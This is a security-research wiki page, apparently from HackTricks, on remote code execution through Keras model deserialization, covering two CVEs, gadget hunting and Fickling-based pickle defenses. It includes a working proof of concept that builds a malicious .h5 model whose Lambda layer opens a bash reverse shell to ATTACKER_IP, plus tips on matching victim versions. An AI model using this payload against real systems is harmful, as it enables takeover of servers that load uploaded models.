# Keras Model Deserialization RCE और Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

यह page Keras model deserialization pipeline के विरुद्ध practical exploitation techniques का सारांश देता है, native .keras format की internal details और attack surface समझाता है, तथा Model File Vulnerabilities (MFVs) और post-fix gadgets खोजने के लिए researcher toolkit प्रदान करता है।

## .keras model format की internal details

एक .keras file एक ZIP archive होती है जिसमें कम-से-कम ये शामिल होते हैं:<sup>[[1]](#references)</sup>
- metadata.json – generic info (जैसे, Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – HDF5 में weights

config.json recursive deserialization को संचालित करता है: Keras modules import करता है, classes/functions resolve करता है और attacker-controlled dictionaries से layers/objects को reconstruct करता है।<sup>[[1]](#references)</sup>

Dense layer object का example snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization निम्न कार्य करता है:<sup>[[1]](#references)</sup>
- `module/class_name` keys से Module import और symbol resolution
- attacker-controlled kwargs के साथ `from_config(...)` या constructor invocation
- nested objects (activations, initializers, constraints, आदि) में recursion

ऐतिहासिक रूप से, इससे `config.json` तैयार करने वाले attacker को तीन primitives मिलते थे:<sup>[[1]](#references)</sup>
- किन modules को import किया जाए, इस पर control
- किन classes/functions को resolve किया जाए, इस पर control
- constructors/from_config में पास किए जाने वाले kwargs पर control

## CVE-2024-3660 – Lambda-layer bytecode RCE

मूल कारण:
- Legacy Lambda deserialization ने attacker-controlled marshaled code से Python function को reconstruct किया: `func_load()` payload को base64-decode करता है, `marshal.loads()` को call करता है और एक `FunctionType` बनाता है। Lambda को invoke किए जाने पर resulting function का bytecode run होता है, और प्रभावित pre-2.13 loaders ने legacy formats के लिए safe-mode checks लागू नहीं किए थे।<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Native Keras v3 archive में, Lambda function को `__lambda__` object के रूप में represent किया जाता है, जिसके `code` field में base64-encoded marshaled code होता है:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Keras native Keras v3 format के लिए डिफ़ॉल्ट रूप से `safe_mode=True` लागू करता है। `Lambda` में Serialized Python lambdas को तब तक block किया जाता है, जब तक user स्पष्ट रूप से `safe_mode=False` के साथ opt out न करे; यह protection legacy formats को उसी तरह cover नहीं करती।<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formats (पुराने HDF5 saves) या पुराने codebases में modern checks लागू नहीं हो सकते, इसलिए victims द्वारा पुराने loaders का उपयोग करने पर “downgrade” style attacks अब भी लागू हो सकते हैं।

## CVE-2025-1550 – Keras 3.0.0–3.8.x में Arbitrary module import

Root cause:
- `_retrieve_class_or_fn` ने `config.json` से attacker-controlled module strings पर `importlib.import_module(module)` का उपयोग किया।
- Impact: एक crafted `.keras` archive `Model.load_model()` से attacker-selected Python modules और functions import करवा सकता था, जिससे import-time side effects और attacker-controlled arguments संभव थे, यहाँ तक कि `safe_mode=True` के साथ भी।<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports केवल official ecosystem modules तक सीमित: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True असुरक्षित Lambda serialized-function loading को block करता है
- Basic type checking: deserialized objects का expected types से match होना आवश्यक है

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras deployments अभी भी HDF5 model files (`.h5`) स्वीकार कर सकते हैं। यदि कोई attacker ऐसा model upload कर सकता है जिसे server बाद में load करता है या उस पर inference चलाता है, तो affected loader attacker-controlled Python वाले Lambda layer को deserialize कर सकता है, जो application के model workflow में execute हो सकता है।<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Target द्वारा model invoke किए जाने पर reverse shell execute करने वाला malicious .h5 तैयार करने के लिए Minimal PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notes and reliability tips:
- Trigger points format और workflow के अनुसार अलग-अलग होते हैं; referenced write-up में prediction के दौरान payload को दो बार execute होते देखा गया। Side effects को repeatable मानें और payloads को idempotent बनाएं।<sup>[[7]](#references)</sup>
- Version pinning: serialization mismatches से बचने के लिए victim के TF/Keras/Python versions से match करें। उदाहरण के लिए, यदि target Python 3.8 और TensorFlow 2.13.1 का उपयोग करता है, तो artifacts इन्हीं versions के अंतर्गत build करें।<sup>[[7]](#references)</sup>
- Quick environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: `os.system("ping -c 1 YOUR_IP")` जैसा benign payload execution की पुष्टि करने में मदद करता है (उदाहरण के लिए, `tcpdump` से ICMP observe करें), इसके बाद reverse shell पर switch करें।<sup>[[7]](#references)</sup>

## Post-fix gadget surface inside allowlist

Keras module allowlist और safe mode के बावजूद, allowed callables side effects expose कर सकते हैं। उदाहरण के लिए, `keras.utils.get_file` एक URL download करता है और उसे configured cache location के अंतर्गत लिखता है, जिससे यह gadget analysis के लिए candidate बन जाता है।<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration (controlled test में call signature validate करें):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
महत्वपूर्ण सीमा:
- `Lambda.call()` हमेशा model input को पहले positional argument के रूप में और configured `arguments` को keyword arguments के रूप में पास करता है। `get_file` के लिए, वह positional value `fname` को भरती है; tensor/path mismatch के कारण कोई भी download होने से पहले यह candidate fail हो सकता है, इसलिए यह guaranteed working gadget नहीं है।<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML models के लिए ML pickle import allowlisting (Fickling)

कई AI/ML model formats (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts और अन्य Python-native formats) Python pickle data को embed करते हैं। ऊपर दिया गया legacy Keras Lambda path इसके बजाय marshaled function bytecode का उपयोग करता है, इसलिए यह एक अलग deserialization risk है। Pickle opcodes deserialization के दौरान attacker-controlled behavior invoke कर सकते हैं, जिसमें model tampering या RCE शामिल है, और simple scanners नए या unlisted dangerous imports को miss कर सकते हैं।<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

एक practical fail-closed defense है कि Python के pickle deserializer को hook किया जाए और unpickling के दौरान केवल reviewed, harmless ML-related imports के set को allow किया जाए। Trail of Bits का Fickling इस policy को implement करता है और हजारों public Hugging Face pickles से बनाया गया curated ML import allowlist प्रदान करता है।<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports के लिए security model (research और practice से निकली intuitions): pickle द्वारा उपयोग किए जाने वाले imported symbols को एक साथ इन सभी शर्तों को पूरा करना चाहिए:<sup>[[8]](#references)</sup>
- Code execute या execution cause न करें (compiled/source code objects, shelling out, hooks आदि नहीं)
- Arbitrary attributes या items को get/set न करें
- Pickle VM से अन्य Python objects के references को import या obtain न करें
- किसी भी secondary deserializer (जैसे marshal, nested pickle) को trigger न करें, indirect रूप से भी नहीं

Process startup में जितना जल्दी संभव हो Fickling की protections enable करें, ताकि frameworks द्वारा किए गए किसी भी pickle loads (`torch.load`, `joblib.load`, आदि) की जांच हो सके:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
संचालन संबंधी सुझाव:
- जहाँ आवश्यक हो, आप hooks को अस्थायी रूप से disable/re-enable कर सकते हैं:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- यदि कोई known-good model block हो जाता है, तो symbols की समीक्षा करने के बाद अपने environment के लिए allowlist का विस्तार करें:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling अधिक granular control पसंद करने पर generic runtime guards भी उपलब्ध कराता है:<sup>[[9]](#references)</sup>
- सभी pickle.load() के लिए checks लागू करने हेतु fickling.always_check_safety()
- scoped enforcement के लिए with fickling.check_safety():
- one-off checks के लिए fickling.load(path) / fickling.is_likely_safe(path)

- जहाँ संभव हो, non-pickle model formats (जैसे, SafeTensors) को प्राथमिकता दें।<sup>[[15]](#references)</sup> यदि pickle स्वीकार करना आवश्यक हो, तो loaders को least privilege के अंतर्गत, network egress के बिना चलाएँ और allowlist लागू करें।

यह allowlist-first strategy compatibility को उच्च बनाए रखते हुए common ML pickle exploit paths को प्रभावी रूप से block करती है। ToB के benchmark में, Fickling ने 100% synthetic malicious files को flag किया और top Hugging Face repos की लगभग 99% clean files को allow किया।<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) allowed modules में systematic gadget discovery

keras, keras_nlp, keras_cv, keras_hub में candidate callables को enumerate करें और उन callables को प्राथमिकता दें जिनमें file/network/process/env side effects हों।<sup>[[1]](#references)</sup>

<details>
<summary>allowlisted Keras modules में potentially dangerous callables को enumerate करें</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing (.keras archive की आवश्यकता नहीं)

स्वीकृत params जानने और side effects देखने के लिए crafted dicts को सीधे Keras deserializers में feed करें।<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing और formats

Keras अलग-अलग guardrails और formats वाले कई codebases/eras में मौजूद है:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, deletion के लिए निर्धारित)
- tf-keras: अलग से maintained
- Multi-backend Keras 3 (official): native .keras पेश किया गया

Regressions या missing guards का पता लगाने के लिए codebases और formats (.keras बनाम legacy HDF5) में tests दोहराएँ।

## References

- [1] [Keras Model Deserialization में Vulnerabilities की खोज (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization में checks जोड़े गए](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE से root तक](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling का नया AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML environments को सुरक्षित करना (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks की पृष्ठभूमि](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers arbitrary Code Injection की अनुमति देते हैं](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
